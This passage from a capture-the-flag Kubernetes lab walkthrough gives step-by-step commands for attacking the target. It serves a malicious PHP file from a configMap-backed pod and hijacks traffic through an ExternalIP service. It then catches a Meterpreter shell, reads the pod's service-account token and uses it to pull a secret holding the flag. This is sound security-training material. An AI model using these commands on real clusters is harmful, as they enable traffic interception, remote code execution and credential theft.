        While there are quite a few volume types out there, we're going to use an unusual one for this exercise. Our `davinci` service account is allowed to create configMaps. We'll make a configMap from the `static-inclusion.php` file we just created and then insert that configMap in as the contents of the web server's `html` directory.

        Use kubectl to create a configMap called `staticinclusionfile` in the `ellingson-min` namespace:

        ```shell
        kubectl-davinci -n ellingson-min create configmap staticinclusionfile --from-file=static-inclusion.php
        ```

158. Take a look at the configMap:

        ```shell
        kubectl-davinci -n ellingson-min get configmap staticinclusionfile -o yaml
        ```

159. Let's create a pod to serve a replacement `static-inclusion.php` page out of that configMap:

        ```shell
        cat <<END >pod-serve-static.yaml
        apiVersion: v1
        kind: Pod
        metadata:
          name: serve-static
          namespace: ellingson-min
          labels:
            app: serve-static
        spec:
          containers:
          - name: serve-static
            image: docker-registry:5000/webserver-without-php
            volumeMounts:
            - name: staticinclusion
              mountPath: /var/www/html/
          volumes:
          - name: staticinclusion
            configMap:
                name: staticinclusionfile  
          imagePullSecrets:
          - name: regcred-docker-registry-5000
        END
        ```

160. Start up the pod:

        ```shell
        kubectl-theplague apply -f pod-serve-static.yaml
        ```

161. Next, we're on to step 3. We need to create an ExternalIP service to redirect requests for an external IP back over to our pod. In another tab, look up the IP address for `static.containersecurityctf.com`.  At the time of this writing, it is `147.182.229.202`. Go back to your Metasploit tab and put that in a variable:

        ```shell
        staticip="147.182.229.202"
        ```

162. Create a manifest for an external IP service to redirect any outbound traffic from the cluster to `static.containersecurityctf.com` to a pod we control instead.

        ```shell
        cat <<END >cve.yaml
        apiVersion: v1
        kind: Service
        metadata:
          name: mitm-cve
          namespace: ellingson-min
        spec:
          selector:
            app: serve-static
          ports:
            - name: http
              protocol: TCP
              port: 80
              targetPort: 8000
          externalIPs:
            - $staticip
        END
        ```

163. Let's apply our cve.yaml file:

        ```shell
        kubectl-davinci apply -f cve.yaml
        ```

164. Finally, we're at step 4. The gibson only requests `static-inclusion.php` when it gets a request. So, launch a request:

        ```shell
        curl -s http://$ip/
        ```

165. We should find that we're notified of another Meterpreter session. Let's switch to the new session.  First, hit Ctrl-Z to background this Meterpreter channel.

        ```
        Hit Ctrl-z
        ```

166. Next, hit y to confirm.

        ```
        Hit y
        ```

167. Now, tell the Metasploit console that you'd like to background the session:

        ```shell
        background
        ```

168. Get a list of sesssions:

        ```shell
        sessions -l
        ```

169. Switch to the new session:

        ```shell
        sessions -i 3
        ```

170. Start a shell:

        ```shell
        shell
        ```

171. Run `bash -i` to make it more friendly.

        ```shell
        bash -i
        ```

172. List the `/` directory:

        ```shell
        ls /
        ```

173. Take a look at the `HINT.txt` file:

        ```shell
        cat /HINT.txt
        ```

174. OK - you've won!

175. Let's use this pod's service account to get a flag. First, set up a kubectl alias:

        ```shell
        tokendir="/run/secrets/kubernetes.io/serviceaccount"
        alias kubectl="kubectl --token=$(cat $tokendir/token) \
        --server="https://kubernetes.default.svc.cluster.local" \
        --certificate-authority=$tokendir/ca.crt \
        -n $(cat $tokendir/namespace)" 
        ```

176. Now, get the flag.

        ```shell
        kubectl get secret flag-gibson -o yaml
        ```

177. Decode the flag:

        ```shell
        kubectl  -n ellingson-min get secret flag-gibson -o yaml | \
        grep flag: | awk '{print $2}' | base64 -d
        ```

178. The flag looked something like this:

        ```
        you-hacked-the-gibson-FLAG-ebcf7d1d-35e8-4e7a-a547-c9a5e364d5ee
        ```

